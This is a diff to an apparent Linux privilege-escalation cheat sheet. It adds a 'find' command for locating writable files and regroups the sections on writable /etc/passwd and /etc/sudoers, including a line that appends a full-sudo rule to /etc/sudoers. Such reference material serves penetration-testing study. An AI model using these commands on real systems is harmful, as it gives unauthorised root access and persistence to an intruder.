@@ -35,8 +35,9 @@
     * [sudo_inject](#sudo-inject)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
-* [Writable /etc/passwd](#writable-etcpasswd)
-* [Writable /etc/sudoers](#writable-etcsudoers)
+* [Writable files](#writable-files)
+    * [Writable /etc/passwd](#writable-etcpasswd)
+    * [Writable /etc/sudoers](#writable-etcsudoers)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
     * [ldconfig](#ldconfig)
@@ -369,8 +370,13 @@ tar cf archive.tar *
 
 Tool: [wildpwn](https://github.com/localh0t/wildpwn)
 
+## Writable files
 
-## Writable /etc/passwd
+```powershell
+find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+```
+
+### Writable /etc/passwd
 
 First generate a password with one of the following commands
 
@@ -400,7 +406,7 @@ su - dummy
 
 NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
 
-## Writable /etc/sudoers
+### Writable /etc/sudoers
 
 ```powershell
 echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
